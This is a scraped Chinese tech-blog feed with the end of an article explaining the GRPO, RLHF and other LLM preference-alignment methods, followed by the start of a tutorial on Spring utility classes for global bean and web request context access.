<li>核心创新：<strong>用 “同一 Prompt 下多条回答的组内相对奖励” 替代 PPO 的 Critic 输出，既去掉了 Critic 模型，又保留了 PPO 的稳定更新机制，同时用 KL 约束防止模型偏离 SFT 的基础能力</strong>。</li>
<li>L_g = -  (1/ G) * ∑^G_(i= 1)  |1 / Yi| ∑^|Yi| _(t=1) min(r_t(θ) * A^i, clip(r_t(θ), 1+ε， 1 - ε) * A^i) −β⋅KL(πθ∥πref)
<ol>
<li>其中 A^i = (Ri - η(r) ) / (σ(r) + 1e -8) 表示组内相对优势值
<ol>
<li>Ri 表示奖励模型对模型生成的 G 条回答，对应每条回答的真实打分</li>
<li>η(r)表示组内奖励均值 σ(r)表示组内奖励标准差，1e-8 是一个防止分母为零的常数</li>
</ol>
</li>
<li>r_t(θ) = π_n(θ) / π_o(θ)  新旧策略生成的概率比</li>
<li>clip(r_t(θ), 1+ε， 1 - ε) 类比 PPO 中裁剪，防止新旧策略差异过大</li>
<li>裁剪损失：min(r_t(θ) * A^i, clip(r_t(θ), 1+ε， 1 - ε) * A^i) ，类比 PPO，保证训练平稳</li>
<li>KL 损失可选，防止模型偏离参考模型</li>
</ol>
</li>
<li>完整训练流程：
<ol>
<li>准备训练数据
<ol>
<li>数据格式：仅需大量 Prompt（如通用问答、代码、数学题），回答由模型实时生成，无需提前标注；</li>
<li>需要和 PPO 一样提前训练好奖励模型，只需 prompt，不需要 DPO 那样的数据格式</li>
</ol>
</li>
<li>模型初始化：加载参考模型，待优化模型，奖励模型
<ol>
<li>同样待优化模型可以使用 lora 这些方法轻量化微调</li>
</ol>
</li>
<li>组采样和奖励打分
<ol>
<li>对每个 Prompt，用旧策略π_O采样G条不同的回答，组成 1 个 “回答组”；</li>
<li>用 RM 给组内每条回答打分，得到奖励分数{r1,r2,...,rG}；</li>
<li>按公式计算每条回答的组内相对优势值A^i。</li>
</ol>
</li>
<li>计算 GRPO 损失(单样本)
<ol>
<li>将组内回答输入新策略πθ，计算每个 token 的新旧策略概率比rt(θ)；</li>
<li>应用 Clip 操作，计算裁剪损失项min(rt(θ)A^i,clip(rt(θ))A^i)；</li>
<li>计算新策略与参考模型的 KL 散度，加入 KL 正则项；</li>
<li>对批次内所有组的损失取平均，得到<strong>批次损失</strong>。</li>
</ol>
</li>
<li>迭代更新(同 DPO)</li>
</ol>
</li>
</ol>
<h2 data-id="heading-5">5 RLHF(Reinforcement Learning from Human Feedback)</h2>
<ol>
<li>RLHF 是<strong>大模型偏好对齐的经典完整体系</strong>，而非单一优化算法，是后续 DPO、GRPO 等轻量化方法的 “鼻祖”。核心逻辑是<strong>通过 “人类反馈” 串联起 “监督微调→奖励模型训练→强化学习” 三个阶段</strong>，实现模型从 “听懂指令” 到 “符合人类偏好” 的全链路优化。</li>
<li>核心思想：
<ol>
<li>第一步（SFT）：教学生 “看懂题目，写出正确答案”</li>
<li>第二步（RM 训练）：教老师 “学会给答案打分（按人类偏好）”</li>
<li>第三步（PPO 强化）：让学生 “根据老师的打分，不断优化答案（更符合偏好）”</li>
</ol>
</li>
<li>RLHF 损失的核心公式分为 <strong>SFT的交叉熵损失</strong> 和<strong>奖励模型（RM）的损失公式</strong>和<strong>PPO 的损失公式</strong>
<ol>
<li>SFT 损失 L_s = - E [∑t ln π(θ)]</li>
<li>奖励模型损失： L_rm = - E [ln σ(rϕ(x,y+)−rϕ(x,y−))]
<ol>
<li>rϕ(x,y)是奖励模型的打分（参数为ϕ），y+是人类偏好的好回答，y−是差回答，σ(⋅)是 Sigmoid 函数（映射到 0~1）。</li>
<li>通过差值实现 “给好回答打高分，差回答打低分”</li>
<li>σ(-),ln(-)函数的意义和 DPO 中是一致的</li>
<li>RM 的排序损失和 DPO 的偏好损失<strong>形式高度相似</strong>，但作用不同 ——RM 是 “学打分”，DPO 是 “直接用偏好对优化模型”。</li>
</ol>
</li>
<li>关于此部分奖励模型的数据格式，与 DPO 是一致的都是三元组，区别是：
<ol>
<li>不管是 RLHF 的 RM，还是 DPO 的偏好对，都需要先有 “同一 prompt 的多条回答”，再筛选 / 排序出y+和y−，比如：y1&gt;y2&gt;y3，形成的数据格式即：(x,y1,y2)、(x,y1,y3)、(x,y2,y3)，这不是 GRPO 的专利</li>
<li>与 GRPO 不同的是：
<ol>
<li>GRPO 训练时<strong>动态生成多条回答</strong>，是为了计算<strong>组内相对优势值</strong>（替代 Critic），直接用于策略优化；</li>
<li>RM 的数据收集阶段<strong>提前生成多条回答</strong>，是为了让<strong>人类排序</strong>，再拆成三元组，用于<strong>训练打分模型</strong>，不直接优化策略。</li>
</ol>
</li>
<li>RM 的损失和 DPO 的损失区别在于，DPO 是人类偏好差，RM 是打分差</li>
</ol>
</li>
</ol>
</li>
<li>PPO 损失：见上 PPO</li>
<li>完整训练流程
<ol>
<li>监督微调（SFT）—— 基础指令适配
<ol>
<li>数据准备：收集 “Prompt + 人类标注的正确回答” 数据（如通用问答、代码解释）；</li>
<li>模型初始化：加载预训练大模型，启用 LoRA/QLoRA 轻量化微调；</li>
<li>损失计算：按 SFT 交叉熵损失计算批次损失；</li>
<li>迭代更新：梯度下降更新模型参数，得到πSFT（RLHF 的基础模型）。</li>
</ol>
</li>
<li>奖励模型（RM）训练 —— 学习人类偏好（核心新环节）
<ol>
<li>数据准备：
<ol>
<li>收集 “同一 Prompt 下的N条不同回答”，让人类按<strong>偏好程度排序</strong>（如y1&gt;y2&gt;y3，&gt;表示 “更偏好”）；</li>
<li>转换为<strong>成对偏好数据</strong>：将排序数据拆分为多个 “好回答 / 差回答” 对（如y1/y2、y1/y3、y2/y3），作为 RM 的训练数据；</li>
</ol>
</li>
<li>模型初始化：(第一步的 SFT 模型作为奖励模型的基础模型)
<ol>
<li>改造输出层：将原有的 “词表大小线性层 + Softmax” 替换为<strong>输出维度 = 1 的线性层</strong>（无激活函数），用于输出标量打分；</li>
<li>启用 LoRA 微调（仅训练低秩矩阵，降低成本）。</li>
</ol>
</li>
<li>损失计算：
<ol>
<li>将成对数据(x,y+,y−)输入 RM，得到打分rϕ(x,y+)和rϕ(x,y−)；</li>
<li>按 RM 排序损失公式计算批次损失（对所有成对样本的损失取平均）。</li>
</ol>
</li>
<li>迭代更新：
<ol>
<li>梯度下降更新 RM 的参数ϕ，让 RM 的打分越来越符合人类排序；</li>
<li>验证：用独立的排序数据评估 RM，若 “RM 打分高低” 与 “人类排序” 的重合度≥90%，则 RM 训练完成。</li>
</ol>
</li>
</ol>
</li>
<li>PPO 强化学习 —— 精准对齐人类偏好
<ol>
<li>模型初始化：
<ol>
<li>加载SFT模型作为<strong>PPO 策略模型*<em>πθ*</em></strong>（也叫待优化模型）和<strong>参考模型</strong>（固定）；</li>
<li>加载SFT 模型并改造输出层，作为<strong>价值模型*<em>Vϕ*</em></strong>（Critic，预估状态价值）；</li>
<li>加载<strong>训练完成的 RM 奖励模型</strong>，用于给生成的回答打分；</li>
<li>对πθ和Vϕ启用 LoRA 微调（仅训练低秩矩阵）。</li>
</ol>
</li>
<li>采样和打分：
<ol>
<li>用旧策略πO对 Prompt 采样生成回答y；</li>
<li>用 RM 给回答打分，得到真实奖励r(x,y)；</li>
<li>计算 token 级的 GAE 优势值A^t</li>
</ol>
</li>
<li>损失计算：按 PPO 组合损失公式，计算裁剪损失、价值损失、KL 正则项，得到批次总损失。</li>
<li>迭代更新：
<ol>
<li>梯度下降同时更新πθ（策略模型）和Vϕ（价值模型）的参数；</li>
<li>定期保存πO（旧策略快照），用于下一轮采样；</li>
<li>验证：用 MT-Bench / 人工打分评估对齐效果，损失不再下降则早停。</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 data-id="heading-6">6 关于不同的优化方法的区别：</h2>













































































<table><thead><tr><th>排序</th><th>方法</th><th>核心定位</th><th>适用场景</th><th>关键特点</th><th>数据格式</th><th>核心对齐方式</th></tr></thead><tbody><tr><td>0</td><td>SFT</td><td>让模型 “听懂指令，生成正确回答”</td><td/><td/><td>「Prompt + 单条回答」</td><td>监督学习，让模型拟合人类标注的指令回答</td></tr><tr><td>1</td><td>PPO</td><td>RLHF 经典核心，在线优化标杆</td><td><strong>资源充足、追求极致对齐效果</strong>、需精细调参</td><td>Actor-Critic + 裁剪 + KL 约束；效果强但工程复杂（4 模型协同）</td><td>「Prompt + 回答 + RM 打分」</td><td>价值模型 + GAE 优势估计（需 RM+ Critic）</td></tr><tr><td>2</td><td>DPO</td><td>离线偏好对齐首选，替代 PPO 的主流方案</td><td><strong>资源有限、快速迭代</strong>、数据质量可控，轻量化对齐</td><td>无 RM/Critic，直接用偏好对优化；训练稳定、算力成本低 70%+</td><td>「Prompt + 好回答 + 差回答」</td><td>离线偏好优化，直接用好坏回答对约束模型生成倾向</td></tr><tr><td>3</td><td>GRPO</td><td>无 Critic 的在线优化，PPO 轻量化替代</td><td><strong>中等算力、需在线更新</strong>、不想维护 Critic</td><td>组内相对奖励替代 Critic；去掉价值网络，训练速度提升 50%+(推理任务、长序列生成、大规模模型)</td><td>prompt</td><td>在线轻量化强化，用组内相对奖励替代 Critic</td></tr><tr><td>4</td><td>RLHF</td><td>大模型偏好对齐领域的经典全链路体系，也是后续所有轻量化对齐方法（DPO/GRPO/KTO）的 “鼻祖”。</td><td>大厂通用大模型研发,高合规要求的垂直领域,需要动态适配用户偏好的场景</td><td>SFT+RM+PPO</td><td>「Prompt + 回答 + RM 打分」</td><td>三阶段全链路对齐：SFT→RM 训练→PPO 强化</td></tr><tr><td>5</td><td>KTO</td><td>二元偏好对齐，适合低成本</td><td>标注标注预算有限、只能获取二元反馈（是 / 否）</td><td>基于前景理论，用二元数据优化；无需排序，标注效率高</td><td/><td>离线二元偏好优化，用 “好 / 坏” 标签替代成对偏好</td></tr><tr><td>6</td><td>RLOO</td><td>在线奖励学习 + 策略优化，小众进阶</td><td>需动态更新奖励、强在线反馈场景，法研究、多场景适配</td><td>结合在线 RM 训练与策略优化；工程复杂，落地案例少</td><td/><td/></tr></tbody></table>
<ol>
<li>
<p><strong>PO 是一类方法的统称（偏好优化，Preference Optimization），不是单独的算法框架</strong>，其核心特征是 <strong>直接用人类偏好数据约束模型生成行为</strong>，而 DPO、KTO、ORPO 等都属于 <strong>PO 家族的具体算法</strong>；<strong>PPO 不属于 PO 范畴</strong>，它是强化学习算法，是 RLHF 体系的核心强化环节。</p>
</li>
<li>
<p>强化学习算法：RLHF（含 PPO）、GRPO、RLOO 等
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ba61cc671a4413a1c8a07704e0bcf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769163546&amp;x-signature=ZTsMGKPleNuaD9bD0YJRuATA6Vw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>是否属于强化学习的方法：是否满足 <strong>「策略模型与环境 / 反馈交互→获取奖励信号→用策略梯度类方法优化模型」</strong> 的闭环逻辑。</li>
</ol>
</li>
</ol>
<h2 data-id="heading-7">参考</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Faifrontiers%2Fp%2F19357323" target="_blank" title="https://www.cnblogs.com/aifrontiers/p/19357323" ref="nofollow noopener noreferrer">1</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[项目“瑞士军刀”：全局 Spring Bean 与 Web 上下文访问工具类]]></title>    <link>https://juejin.cn/post/7595815509234237480</link>    <guid>https://juejin.cn/post/7595815509234237480</guid>    <pubDate>2026-01-16T09:50:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595815509234237480" data-draft-id="7595794942086709283" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="项目“瑞士军刀”：全局 Spring Bean 与 Web 上下文访问工具类"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-16T09:50:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不止CRUD"/> <meta itemprop="url" content="https://juejin.cn/user/3766269895520140"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            项目“瑞士军刀”：全局 Spring Bean 与 Web 上下文访问工具类
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3766269895520140/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不止CRUD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:50:31.000Z" title="Fri Jan 16 2026 09:50:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在标准 Spring 开发中，我们通常使用 <code>@Autowired</code> 进行依赖注入。但在一些非 Bean 管理的场景（如：静态工具类、某些三方框架的扩展点、或复杂的单例模式）中，我们无法直接注入对象。</p>
<p>在 Web 场景，我们只能在 Controller 的方法参数中获取 <code>HttpServletRequest</code> 或 <code>Response</code>。但在架构底层（如切面、拦截器、甚至是 Service 层），如果需要获取当前请求的 Header、IP 地址或 Session 信息，层层传递参数显然太笨重。</p>
<p>为了解决上面两个项目开发过程中的痛点，我们需要实现 <code>ApplicationContextAware</code> 接口，构建一个全局的 <strong>SpringContextHolder</strong>；利用 <code>RequestContextHolder</code>，在代码的任何角落静默获取当前线程关联的请求上下文。</p>
<h2 data-id="heading-1"><code>ApplicationContextAware</code></h2>
<p><code>ApplicationContextAware</code> 接口可以感知 Spring 中 <code>ApplicationContext</code>，通过实现 <code>ApplicationContextAware</code> 接口，Spring 会在启动时自动把容器引用（<code>ApplicationContext</code>）“注入”到这个类中。我们把它存入一个静态变量，就能在<strong>任何地方</strong>手动获取 Bean。</p>
<p>基本用法：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringContextHolder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationContextAware</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ApplicationContext applicationContext;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(ApplicationContext context)</span> <span class="hljs-keyword">throws</span> BeansException {
        applicationContext = context;
    }

    <span class="hljs-comment">// 通过类型获取 Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;T&gt; clazz)</span> {
        <span class="hljs-keyword">return</span> applicationContext.getBean(clazz);
    }

    <span class="hljs-comment">// 通过名称获取 Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-keyword">return</span> applicationContext.getBean(name);
    }
}
</code></pre>
<h2 data-id="heading-2"><code>RequestContextHolder</code></h2>
<p><code>RequestContextHolder</code> 利用了 <strong>ThreadLocal</strong>。Spring MVC 在接收到请求时，会将当前请求的 <code>Request</code> 和 <code>Response</code> 绑定到处理该请求的线程上。只要你还在同一个线程内，就能随时“隔空取物”。</p>
<p>基本用法:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebUtils</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HttpServletRequest <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ServletRequestAttributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
        <span class="hljs-keyword">return</span> attributes != <span class="hljs-literal">null</span> ? attributes.getRequest() : <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">// 快捷获取 Header</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getHeader</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> getRequest();
        <span class="hljs-keyword">return</span> request != <span class="hljs-literal">null</span> ? request.getHeader(name) : <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h2 data-id="heading-3">扩展 <code>ApplicationContextAware</code> 能力</h2>
<p>下面内容是对实际项目中，常见场景的封装：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringContextHolder</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationContextAware</span>, DisposableBean {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">/**
     * 获取 ApplicationContext
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationContext <span class="hljs-title function_">getApplicationContext</span><span class="hljs-params">()</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> applicationContext;
    }

    <span class="hljs-comment">/**
     * 获取环境属性
     *
     * <span class="hljs-doctag">@param</span> key 属性名
     * <span class="hljs-doctag">@return</span> 属性值
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getProperty</span><span class="hljs-params">(String key)</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> applicationContext.getEnvironment().getProperty(key);
    }

    <span class="hljs-comment">/**
     * 获取环境属性
     *
     * <span class="hljs-doctag">@param</span> key          属性名
     * <span class="hljs-doctag">@param</span> defaultValue 默认值
     * <span class="hljs-doctag">@return</span> 属性值
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getProperty</span><span class="hljs-params">(String key, String defaultValue)</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> applicationContext.getEnvironment().getProperty(key, defaultValue);
    }

    <span class="hljs-comment">/**
     * 获取环境属性
     *
     * <span class="hljs-doctag">@param</span> key        属性名
     * <span class="hljs-doctag">@param</span> targetType 目标类型
     * <span class="hljs-doctag">@param</span> &lt;T&gt;        泛型
     * <span class="hljs-doctag">@return</span> 属性值
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">getProperty</span><span class="hljs-params">(String key, Class&lt;T&gt; targetType)</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> applicationContext.getEnvironment().getProperty(key, targetType);
    }

    <span class="hljs-comment">/**
     * 从静态变量 applicationContext 中取得 Bean, 自动转型为所赋值对象的类型
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> (T) applicationContext.getBean(name);
    }

    <span class="hljs-comment">/**
     * 从静态变量 applicationContext 中取得 Bean, 自动转型为所赋值对象的类型
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;T&gt; requiredType)</span> {
        assertContextInjected();
        <span class="hljs-keyword">return</span> applicationContext.getBean(requiredType);
    }

    <span class="hljs-comment">/**
     * 发布事件
     *
     * <span class="hljs-doctag">@param</span> event 事件对象
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishEvent</span><span class="hljs-params">(ApplicationEvent event)</span> {
        <span class="hljs-keyword">if</span> (applicationContext == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span>;
        }
        applicationContext.publishEvent(event);
    }

    <span class="hljs-comment">/**
     * 清除 SpringContextHolder 中的 ApplicationContext 为 null
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearHolder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {
            log.debug(<span class="hljs-string">"清除 SpringContextHolder 中的 ApplicationContext: {}"</span>, applicationContext);
        }
        applicationContext = <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * 当 Spring 容器初始化这个 Bean 时，将 ApplicationContext 注入到静态变量中
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(ApplicationContext applicationContext)</span> <span class="hljs-keyword">throws</span> BeansException {
        SpringContextHolder.applicationContext = applicationContext;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> {
        SpringContextHolder.clearHolder();
    }

    <span class="hljs-comment">/**
     * 检查 ApplicationContext 是否注入
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assertContextInjected</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (applicationContext == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(
                    <span class="hljs-string">"applicationContext 属性未注入, 请确保 SpringContextHolder 已注册为 Bean，且在 Spring 上下文初始化完成后调用。"</span>);
        }
    }
}

</code></pre>
<h2 data-id="heading-4">扩展 <code>RequestContextHolder</code> 能力</h2>
<p>下面内容是对实际项目中，常见场景的封装：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@UtilityClass</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebUtils</span> {

    <span class="hljs-comment">/**
     * 获取 HttpServletRequest
     */</span>
    <span class="hljs-keyword">public</span> HttpServletRequest <span class="hljs-title function_">getRequest</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Optional.ofNullable(RequestContextHolder.getRequestAttributes())
                .map(ServletRequestAttributes.class::cast)
                .map(ServletRequestAttributes::getRequest)
                .orElse(<span class="hljs-literal">null</span>);
    }

    <span class="hljs-comment">/**
     * 获取 HttpServletResponse
     */</span>
    <span class="hljs-keyword">public</span> HttpServletResponse <span class="hljs-title function_">getResponse</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Optional.ofNullable(RequestContextHolder.getRequestAttributes())
                .map(ServletRequestAttributes.class::cast)
                .map(ServletRequestAttributes::getResponse)
                .orElse(<span class="hljs-literal">null</span>);
    }

    <span class="hljs-comment">/**
     * 判断是否是 JSON 请求
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isJsonRequest</span><span class="hljs-params">(HandlerMethod handlerMethod)</span> {
        <span class="hljs-comment">// 1. 类上有 @RestController</span>
        <span class="hljs-keyword">if</span> (handlerMethod.getBeanType().isAnnotationPresent(RestController.class)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-comment">// 2. 方法或类上有 @ResponseBody</span>
